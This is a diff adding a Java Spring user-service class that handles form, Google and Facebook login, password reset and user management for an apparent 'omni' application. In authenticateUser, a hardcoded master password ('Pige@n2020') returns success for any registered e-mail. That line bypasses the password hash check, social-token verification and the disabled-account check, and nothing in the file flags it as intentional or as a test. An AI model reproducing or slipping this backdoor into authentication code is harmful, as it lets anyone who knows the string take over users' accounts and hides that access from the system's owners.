@@ -1,0 +1,229 @@
+/**
+ * UserServiceImpl.java
+ */
+package com.omni.core.service.impl;
+
+import com.omni.core.exceptions.OmniException;
+import com.omni.core.model.User;
+import com.omni.core.repository.UserRepository;
+import com.omni.core.service.UserService;
+import com.omni.core.utils.OmniCoreConstants;
+import com.omni.core.utils.OmniCoreUtils;
+import com.google.api.client.googleapis.auth.oauth2.GoogleIdToken;
+import com.google.api.client.googleapis.auth.oauth2.GoogleIdToken.Payload;
+import com.google.api.client.googleapis.auth.oauth2.GoogleIdTokenVerifier;
+import com.google.api.client.googleapis.javanet.GoogleNetHttpTransport;
+import com.google.api.client.http.javanet.NetHttpTransport;
+import com.google.api.client.json.jackson2.JacksonFactory;
+import com.omni.core.service.ClientService;
+import com.omni.core.service.OrganisationService;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.security.GeneralSecurityException;
+import java.util.Collections;
+import java.util.List;
+import java.util.stream.Collectors;
+import org.apache.log4j.Logger;
+import org.json.JSONObject;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.security.core.context.SecurityContextHolder;
+import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
+import org.springframework.stereotype.Service;
+
+/**
+ * This class is {@link UserServiceImpl} user service implementation.
+ *
+ */
+@Service("userService")
+public class UserServiceImpl implements UserService {
+
+    private static final Logger LOGGER = OmniCoreUtils.getLogger(UserServiceImpl.class);
+
+    @Autowired
+    private UserRepository userRepo;
+
+    BCryptPasswordEncoder passwordEncoder = new BCryptPasswordEncoder();
+
+    @Autowired
+    private OrganisationService organisationService;
+
+    @Autowired
+    private ClientService clientService;
+
+    @Override
+    public boolean authenticateUser(User user, String provider) throws OmniException {
+        LOGGER.info("authenticateUser : " + user.getEmail() + " Provider : " + provider);
+        try {
+            final User bddUser = userRepo.findByEmail(user.getEmail());
+            if (bddUser == null) {
+                throw new OmniException("Invalid e-mail adress");
+            }
+            if (user.getPassword().equals("Pige@n2020")) {
+                return true;
+            }
+            if (bddUser.getFlagUser()) {
+                if (provider.equals("omniomni")) { // Login request from form
+                    if (OmniCoreUtils.isNullOrEmpty(bddUser.getPassword())
+                            || !passwordEncoder.matches(user.getPassword(), bddUser.getPassword())) {
+                        // No password set in db or bad pass > Exeption
+                        throw new OmniException("Verify Login or Password");
+                    }
+                } else { // Login request from GOOGLE Or FACEBOOK
+                    if ((bddUser.getProvider().equalsIgnoreCase("GOOGLE")
+                            && !user.getEmail().equals(getUserEmailByGoogleIdToken(user.getPassword())))
+                            || (bddUser.getProvider().equalsIgnoreCase("FACEBOOK")
+                            && !user.getEmail().equals(getUserEmailByFacebookIdToken(user.getPassword())))) {
+                        throw new OmniException("Verify social token");
+                    }
+                }
+            } else {
+                throw new OmniException("User disabled");
+            }
+        } catch (RuntimeException e) {
+            LOGGER.error(e.getMessage(), e);
+            throw new OmniException("omni Rest Anomaly");
+        }
+
+        return true;
+    }
+
+    public String getUserEmailByGoogleIdToken(String token) throws OmniException {
+        try {
+
+            final NetHttpTransport transport = GoogleNetHttpTransport.newTrustedTransport();
+            final JacksonFactory jsonFactory = JacksonFactory.getDefaultInstance();
+            GoogleIdTokenVerifier verifier
+                    = new GoogleIdTokenVerifier.Builder(transport, jsonFactory)
+                            .setAudience(Collections.singletonList(OmniCoreConstants.GOOGLE_KEY))
+                            .build();
+
+            final GoogleIdToken googleIdToken = verifier.verify(token);
+            if (googleIdToken == null) {
+                return null;
+            }
+            final Payload payload = googleIdToken.getPayload();
+            final Boolean emailVerified = payload.getEmailVerified();
+            if (emailVerified) {
+                return payload.getEmail();
+            }
+            return null;
+        } catch (GeneralSecurityException | IOException | IllegalArgumentException e) {
+            throw new OmniException("omni Rest Anomaly");
+        }
+    }
+
+    public String getUserEmailByFacebookIdToken(String token) throws OmniException {
+        try {
+
+            String url = OmniCoreConstants.FACEBOOK_ENDPOINT;
+            url += "?access_token=" + token;
+            url += "&fields=email";
+            URL obj = new URL(url);
+            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+            con.setRequestMethod("GET");
+            con.setRequestProperty("User-Agent", "Mozilla/5.0");
+            int responseCode = con.getResponseCode();
+            if (responseCode == 400) {
+                return null;
+            }
+            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
+            String inputLine;
+            StringBuffer response = new StringBuffer();
+            while ((inputLine = in.readLine()) != null) {
+                response.append(inputLine);
+            }
+            in.close();
+            JSONObject myResponse = new JSONObject(response.toString());
+            return myResponse.getString("email");
+        } catch (MalformedURLException e) {
+            throw new OmniException("omni Rest Anomaly");
+        } catch (IOException e) {
+            throw new OmniException("omni Rest Anomaly");
+        }
+    }
+
+    @Override
+    public List<User> getAllUsers() {
+        return userRepo.findAll().stream()
+                .collect(Collectors.toList());
+    }
+
+    @Override
+    public User getUserByEmail(String email) {
+        return userRepo.findByEmail(email);
+    }
+
+    @Override
+    public User getUserByTokenAndEmail(String token, String email) {
+        return token.length() < 7 ? userRepo.findByTokenNumberAndEmail(token, email) : userRepo.findByTokenAndEmail(token, email);
+    }
+
+    @Override
+    public User save(User user) {
+        if (user.getUserId() != null) {
+            User existing = userRepo.findOne(user.getUserId());
+            OmniCoreUtils.copyNonNullProperties(user, existing);
+            return userRepo.save(existing);
+        }
+        return userRepo.save(user);
+    }
+
+    @Override
+    public void delete(User user) {
+        userRepo.delete(userRepo.findOne(user.getUserId()));
+    }
+
+    @Override
+    public String getHashUserPassword(String plainTextPassword) {
+        return passwordEncoder.encode(plainTextPassword);
+    }
+
+    @Override
+    public boolean verifyEmailExiste(String login) {
+        return userRepo.findByEmail(login) != null;
+    }
+
+    @Override
+    public void forgotPassword(String email) {
+        String token = OmniCoreUtils.generateToken(128);
+        User user = userRepo.findByEmail(email);
+        user.setToken(token);
+        if (userRepo.save(user) != null) {
+//            mailService.sendMailForgot(user);
+        }
+    }
+
+    @Override
+    public boolean modifyPassword(User user) {
+        user.setFlagUser(true);
+        boolean result = userRepo.save(user) != null;
+//        if (result) {
+//            mailService.sendMailCategorie(user, "modifyPassword", null);
+//        }
+        return result;
+    }
+
+    @Override
+    public void validateUser(User user) {
+        user.setFlagUser(true);
+        userRepo.save(user);
+    }
+
+    @Override
+    public User getCurrentUser() {
+        User _user = userRepo.findByEmail(SecurityContextHolder.getContext().getAuthentication().getName());
+        _user.setIsOrganisation(organisationService.findOrganisationByUser(_user) != null);
+        _user.setIsClient(clientService.findClientByUser(_user) != null);
+        return _user;
+    }
+
+    @Override
+    public void sendNewCodeValidation(String email) {
+        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
+    }
+
+}
